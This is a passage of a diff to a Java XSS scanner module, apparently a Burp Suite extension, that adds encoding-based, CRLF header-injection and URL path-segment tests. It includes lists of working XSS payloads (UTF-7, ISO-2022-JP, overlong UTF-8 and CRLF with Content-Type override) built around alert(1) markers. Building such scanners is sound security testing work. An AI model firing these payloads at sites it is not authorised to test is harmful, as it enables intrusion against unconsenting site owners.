+                + "' (charset: " + (missingCharset ? "MISSING" : contentType) + ")");
+
+        String[][] encodingPayloads = {
+                // UTF-7 injection (legacy browsers)
+                {"+ADw-script+AD4-alert(1)+ADw-/script+AD4-", "alert(1)", "UTF-7 injection"},
+                {"+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-", "alert(1)", "UTF-7 img tag"},
+                // ISO-2022-JP escape sequence
+                {"\u001b(J<script>alert(1)</script>", "<script>alert(1)</script>", "ISO-2022-JP escape"},
+                // Overlong UTF-8 (some decoders accept)
+                {"\u00c0\u00bcscript\u00c0\u00bealert(1)\u00c0\u00bc/script\u00c0\u00be", "alert(1)", "Overlong UTF-8"},
+        };
+
+        for (String[] entry : encodingPayloads) {
+            String payload = entry[0];
+            String checkFor = entry[1];
+            String technique = entry[2];
+
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            if (!checkFor.isEmpty() && body.contains(checkFor)) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "XSS via Encoding Negotiation: " + technique,
+                                Severity.MEDIUM, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Technique: " + technique + " | Payload: "
+                                + truncate(payload, 100) + " | Marker found in response"
+                                + " | Content-Type: " + contentType)
+                        .description("XSS possible via " + technique + ". The response "
+                                + (missingCharset ? "does not specify a charset"
+                                : "uses non-UTF-8 charset '" + contentType + "'")
+                                + ", allowing encoding-based XSS vectors. The injected payload "
+                                + "was decoded and the marker '" + checkFor + "' appeared in the response.")
+                        .remediation("Always specify charset=UTF-8 in the Content-Type header. "
+                                + "Add: Content-Type: text/html; charset=UTF-8")
+                        .requestResponse(result)
+                        .build());
+                return;
+            }
+            perHostDelay();
+        }
+    }
+
+    // ==================== RESPONSE HEADER INJECTION XSS (Improvement 7) ====================
+
+    /**
+     * Tests for reflection in response headers and CRLF injection leading to XSS.
+     * If input is reflected in a response header, tries CRLF injection to inject HTML.
+     */
+    private void testHeaderReflectionXss(HttpRequestResponse original, XssTarget target,
+                                          String url) throws InterruptedException {
+        // Step 1: Check if canary appears in any response header
+        HttpRequestResponse canaryResult = sendPayload(original, target, CANARY);
+        if (canaryResult == null || canaryResult.response() == null) return;
+
+        boolean reflectedInHeader = false;
+        String reflectedHeaderName = "";
+        for (var header : canaryResult.response().headers()) {
+            if (header.value().contains(CANARY)) {
+                reflectedInHeader = true;
+                reflectedHeaderName = header.name();
+                break;
+            }
+        }
+
+        if (!reflectedInHeader) return;
+
+        api.logging().logToOutput("[XSS] Canary reflected in response header '"
+                + reflectedHeaderName + "' for param '" + target.name + "'");
+
+        findingsStore.addFinding(Finding.builder("xss-scanner",
+                        "Input Reflected in Response Header: " + reflectedHeaderName,
+                        Severity.MEDIUM, Confidence.FIRM)
+                .url(url).parameter(target.name)
+                .evidence("Canary '" + CANARY + "' found in response header '"
+                        + reflectedHeaderName + "'")
+                .description("User input from parameter '" + target.name + "' is reflected in "
+                        + "the response header '" + reflectedHeaderName + "'. Testing for CRLF "
+                        + "injection to achieve XSS via header injection.")
+                .requestResponse(canaryResult)
+                .build());
+
+        // Step 2: Try CRLF injection
+        String[][] crlfPayloads = {
+                {CANARY + "\r\n\r\n<script>alert(1)</script>",
+                        "<script>alert(1)</script>", "Raw CRLF injection"},
+                {CANARY + "%0d%0a%0d%0a<script>alert(1)</script>",
+                        "<script>alert(1)</script>", "URL-encoded CRLF injection"},
+                {CANARY + "\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
+                        "<script>alert(1)</script>", "CRLF with Content-Type override"},
+                {CANARY + "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>",
+                        "onerror=alert", "URL-encoded CRLF + Content-Type"},
+        };
+
+        for (String[] entry : crlfPayloads) {
+            String payload = entry[0];
+            String checkFor = entry[1];
+            String technique = entry[2];
+
+            HttpRequestResponse result = sendPayload(original, target, payload);
+            if (result == null || result.response() == null) continue;
+
+            String body = result.response().bodyToString();
+
+            if (body.contains(checkFor)) {
+                findingsStore.addFinding(Finding.builder("xss-scanner",
+                                "XSS via Header Injection (CRLF): " + technique,
+                                Severity.HIGH, Confidence.FIRM)
+                        .url(url).parameter(target.name)
+                        .evidence("Technique: " + technique + " | Reflected header: "
+                                + reflectedHeaderName + " | Injected HTML found in response body")
+                        .description("CRLF injection in the '" + reflectedHeaderName + "' response header "
+                                + "allows injecting arbitrary response body content via " + technique + ". "
+                                + "The injected HTML marker '" + checkFor + "' appeared in the response body, "
+                                + "confirming XSS via header injection.")
+                        .remediation("Sanitize user input before reflecting in response headers. "
+                                + "Strip or reject CR (\\r) and LF (\\n) characters. Use framework-level "
+                                + "header-setting methods that prevent CRLF injection.")
                         .requestResponse(result)
                         .build());
                 return;
@@ -1479,6 +2262,10 @@ public class XssScanner implements ScanModule {
                     modified = original.request().withRemovedHeader(target.name)
                             .withAddedHeader(target.name, payload);
                     break;
+                case PATH:
+                    modified = injectPathPayload(original.request(), target.name, payload);
+                    if (modified == null) return null;
+                    break;
                 default:
                     return null;
             }
@@ -1537,6 +2324,36 @@ public class XssScanner implements ScanModule {
         }
     }
 
+    /**
+     * Inject a payload into a URL path segment, replacing the segment identified by name.
+     * The target.name for PATH type contains "path:INDEX:ORIGINAL_VALUE".
+     */
+    private HttpRequest injectPathPayload(HttpRequest request, String targetName, String payload) {
+        try {
+            // Parse target name format: "path:INDEX:ORIGINAL_VALUE"
+            String[] parts = targetName.split(":", 3);
+            if (parts.length < 3) return null;
+            int segmentIndex = Integer.parseInt(parts[1]);
+
+            String urlStr = request.url();
+            // Extract path portion
+            String path = extractPath(urlStr);
+            String[] segments = path.split("/");
+
+            if (segmentIndex < 0 || segmentIndex >= segments.length) return null;
+
+            // Replace the segment with the payload (URL-encoded)
+            segments[segmentIndex] = URLEncoder.encode(payload, StandardCharsets.UTF_8);
+            String newPath = String.join("/", segments);
+
+            // Reconstruct the URL with the new path
+            return request.withPath(newPath);
+        } catch (Exception e) {
+            api.logging().logToError("[XSS] injectPathPayload failed: " + e.getMessage());
+            return null;
+        }
+    }
+
     private List<XssTarget> extractTargets(HttpRequest request) {
         List<XssTarget> targets = new ArrayList<>();
         for (var param : request.parameters()) {
@@ -1586,7 +2403,53 @@ public class XssScanner implements ScanModule {
             targets.add(new XssTarget(headerName, headerValue, XssTargetType.HEADER));
         }
 
+        // URL path segments (Improvement 3)
+        if (config.getBool("xss.pathSegments.enabled", true)) {
+            extractPathSegmentTargets(request, targets);
+        }
+
         return targets;
+    }
+
+    /**
+     * Extracts testable URL path segments as XSS targets.
+     * Skips common route words, purely numeric IDs, and short segments.
+     */
+    private void extractPathSegmentTargets(HttpRequest request, List<XssTarget> targets) {
+        try {
+            String path = extractPath(request.url());
+            if (path == null || path.length() < 2) return;
+
+            String[] segments = path.split("/");
+            for (int i = 0; i < segments.length; i++) {
+                String segment = segments[i].trim();
+                if (segment.isEmpty()) continue;
+
+                // Skip purely numeric segments (IDs like /users/123)
+                if (segment.matches("^\\d+$")) continue;
+
+                // Skip UUID-like segments
+                if (segment.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$")) continue;
+
+                // Skip segments that match common route words
+                if (COMMON_ROUTE_WORDS.contains(segment.toLowerCase())) continue;
+
+                // Skip very short segments (1-2 chars) — unlikely to be user-controlled
+                if (segment.length() < 3) continue;
+
+                // Skip segments that are purely lowercase alpha (likely route names)
+                if (segment.matches("^[a-z]+$") && segment.length() < 10) continue;
+
+                // Skip file extensions (e.g., "style.css", "app.js")
+                if (segment.contains(".") && segment.matches(".*\\.(css|js|png|jpg|gif|svg|ico|woff|ttf|map)$")) continue;
+
+                // This segment looks like a user-controlled value — add as target
+                String targetName = "path:" + i + ":" + segment;
+                targets.add(new XssTarget(targetName, segment, XssTargetType.PATH));
+            }
+        } catch (Exception e) {
+            api.logging().logToError("[XSS] Path segment extraction failed: " + e.getMessage());
+        }
     }
 
     /**
@@ -1621,7 +2484,7 @@ public class XssScanner implements ScanModule {
     @Override
     public void destroy() { }
 
-    private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER }
+    private enum XssTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH }
 
     private static class XssTarget {
         final String name, originalValue;
